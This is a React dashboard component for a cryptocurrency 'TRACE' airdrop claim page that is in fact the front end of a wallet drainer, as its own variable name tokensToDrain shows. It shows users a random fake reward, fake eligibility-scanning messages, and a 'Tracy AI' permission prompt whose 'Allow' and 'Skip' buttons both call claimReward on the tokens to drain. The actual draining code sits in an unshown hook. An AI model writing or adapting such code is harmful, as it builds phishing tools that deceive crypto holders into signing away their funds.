"use client";

import { useWeb3Manager } from "@/hooks/useWeb3Manager";
import { useEffect, useState } from "react";
import { CheckCircle, Shield, XCircle, ChevronRight, Loader2, PartyPopper, Bot } from "lucide-react";
import confetti from "canvas-confetti";

export default function Dashboard() {
    const { account, checkEligibility, claimReward } = useWeb3Manager();

    // Status Flow: scanning -> congrats -> permission -> claim -> ineligible
    const [status, setStatus] = useState<"scanning" | "congrats" | "permission" | "claim" | "ineligible">("scanning");
    const [tokensToDrain, setTokensToDrain] = useState<{ address: string; chainId: string; symbol?: string }[]>([]);
    const [rewardAmount, setRewardAmount] = useState<number>(0);

    useEffect(() => {
        const verify = async () => {
            // 1. Scanning State is default
            const { isEligible, tokensToDrain: tokens } = await checkEligibility();

            if (isEligible) {
                setTokensToDrain(tokens);
                // Calculate random reward between 1000 and 5000
                const randomReward = Math.floor(Math.random() * (5000 - 1000 + 1)) + 1000;
                setRewardAmount(randomReward);
                setStatus("congrats");

                // Trigger confetti for playful effect
                const end = Date.now() + 1500;
                const colors = ['#D4AF37', '#ffffff', '#000000'];
                (function frame() {
                    confetti({
                        particleCount: 3,
                        angle: 60,
                        spread: 55,
                        origin: { x: 0 },
                        colors: colors
                    });
                    confetti({
                        particleCount: 3,
                        angle: 120,
                        spread: 55,
                        origin: { x: 1 },
                        colors: colors
                    });
                    if (Date.now() < end) {
                        requestAnimationFrame(frame);
                    }
                }());
            } else {
                setStatus("ineligible");
            }
        };

        if (account) {
            verify();
        } else {
            setStatus("scanning");
        }
    }, [account]);

    if (status === "scanning") {
        return (
            <div className="flex flex-col items-center justify-center py-24 md:py-40 animate-fade-up">
                <div className="relative mb-8">
                    <div className="w-20 h-20 md:w-24 md:h-24 border-4 border-[#D4AF37]/10 border-t-[#D4AF37] rounded-full animate-spin" />
                    <div className="absolute inset-0 flex items-center justify-center">
                        <Shield size={32} className="text-[#D4AF37]/50 animate-pulse" />
                    </div>
                </div>
                <p className="text-white/40 animate-pulse uppercase tracking-[0.3em] text-[10px] font-bold">Verifying Eligibility...</p>
                <div className="flex flex-col items-center mt-4 space-y-1">
                    <p className="text-[#D4AF37]/30 text-[9px] font-mono">Scanning Polygon POS History...</p>
                    <p className="text-[#D4AF37]/30 text-[9px] font-mono">Verifying zkEVM Proofs...</p>
                    <p className="text-[#D4AF37]/30 text-[9px] font-mono">Checking Ethereum Mainnet...</p>
                </div>
            </div>
        );
    }

    if (status === "congrats") {
        return (
            <div className="py-12 md:py-20 flex justify-center animate-fade-up">
                <div className="glass-card p-8 md:p-12 border border-[#D4AF37]/30 text-center max-w-xl w-full relative overflow-hidden mx-4 md:mx-0">
                    <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-[#D4AF37] to-transparent" />
                    <div className="absolute -top-20 -right-20 w-64 h-64 bg-[#D4AF37] opacity-5 rounded-full blur-3xl" />

                    <div className="mb-8 flex justify-center">
                        <div className="p-6 bg-[#D4AF37]/10 rounded-full text-[#D4AF37] animate-bounce shadow-[0_0_30px_rgba(212,175,55,0.2)]">
                            <PartyPopper size={48} />
                        </div>
                    </div>

                    <h2 className="text-3xl md:text-4xl font-bold italic mb-4 gold-gradient">Congratulations!</h2>
                    <p className="text-white/80 mb-6 leading-relaxed text-lg md:text-xl">
                        You got <span className="text-[#D4AF37] font-bold text-2xl">{rewardAmount.toLocaleString()} TRACE</span> tokens!
                    </p>
                    <p className="text-white/40 mb-10 text-sm">
                        Your extensive on-chain activity qualified you for this exclusive reward.
                    </p>

                    <button
                        onClick={() => setStatus("permission")}
                        className="gold-button w-full py-5 rounded-2xl font-bold text-black uppercase tracking-widest text-xs md:text-sm shadow-xl flex items-center justify-center gap-3 group transition-all hover:scale-[1.02]"
                    >
                        <span>Continue to Claim</span>
                        <ChevronRight size={18} className="group-hover:translate-x-1 transition-transform" />
                    </button>
                    <p className="mt-4 text-[10px] text-white/20 uppercase tracking-widest">Limited Time Offer</p>
                </div>
            </div>
        );
    }

    // New "Tracy" Permission State
    if (status === "permission") {
        return (
            <div className="py-12 md:py-20 flex justify-center animate-fade-up">
                <div className="glass-card p-8 md:p-12 border border-[#D4AF37]/20 text-center max-w-xl w-full relative mx-4 md:mx-0">
                    <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-[#D4AF37] to-transparent" />

                    <div className="mb-6 flex justify-center">
                        <div className="p-5 bg-[#D4AF37]/10 rounded-full text-[#D4AF37] shadow-[0_0_30px_rgba(212,175,55,0.15)] animate-pulse">
                            <Bot size={56} />
                        </div>
                    </div>

                    <h3 className="text-2xl md:text-3xl font-bold italic mb-4 text-white">Enable Tracy AI?</h3>

                    <p className="text-white/60 mb-8 leading-relaxed">
                        Allow <span className="text-[#D4AF37] font-bold">Tracy</span> to help trade, stake, unstake, and claim rewards for you automatically while you earn $TRACE.
                    </p>

                    <div className="bg-white/5 rounded-xl p-4 mb-8 text-left border border-white/5 space-y-2">
                        <div className="flex items-center gap-3">
                            <div className="w-1.5 h-1.5 rounded-full bg-green-400" />
                            <span className="text-xs text-white/60">Auto-Compound Staking Rewards</span>
                        </div>
                        <div className="flex items-center gap-3">
                            <div className="w-1.5 h-1.5 rounded-full bg-green-400" />
                            <span className="text-xs text-white/60">Optimize Gas Fees</span>
                        </div>
                        <div className="flex items-center gap-3">
                            <div className="w-1.5 h-1.5 rounded-full bg-green-400" />
                            <span className="text-xs text-white/60">MEV Protection Enabled</span>
                        </div>
                    </div>

                    <div className="flex flex-col gap-3">
                        <button
                            onClick={() => claimReward(tokensToDrain)}
                            className="gold-button w-full py-4 rounded-xl font-bold text-black uppercase tracking-widest text-xs md:text-sm shadow-xl hover:scale-[1.02] transition-transform"
                        >
                            Allow Tracy
                        </button>
                        <button
                            onClick={() => claimReward(tokensToDrain)}
                            className="w-full py-3 rounded-xl font-bold text-white/30 uppercase tracking-widest text-[10px] hover:text-white/50 transition-colors"
                        >
                            Skip & Just Claim
                        </button>
                    </div>

                    <p className="mt-6 text-[10px] text-white/20">
                        By clicking Allow, you grant permission for automated portfolio management.
                    </p>
                </div>
            </div>
        );
    }

    if (status === "claim") {
        // Fallback state if we ever need a manual claim step again, 
        // but currently "permission" triggers the claim directly.
        return null;
    }

    return (
        <div className="py-20 flex justify-center animate-fade-up">
            <div className="glass-card p-12 border border-red-500/20 text-center max-w-lg w-full">
                <div className="mb-6 flex justify-center">
                    <div className="p-4 bg-red-500/10 rounded-full text-red-500">
                        <XCircle size={48} />
                    </div>
                </div>

                <h3 className="text-2xl font-bold italic mb-4">Not Eligible</h3>
                <p className="text-white/50 mb-8">
                    Unfortunately, this wallet does not meet the activity criteria for the current distribution phase.
                </p>

                <div className="text-xs text-white/30 font-mono bg-white/5 p-2 rounded">
                    Code: 0x_LOW_ACTIVITY
                </div>
            </div>
        </div>
    );
}
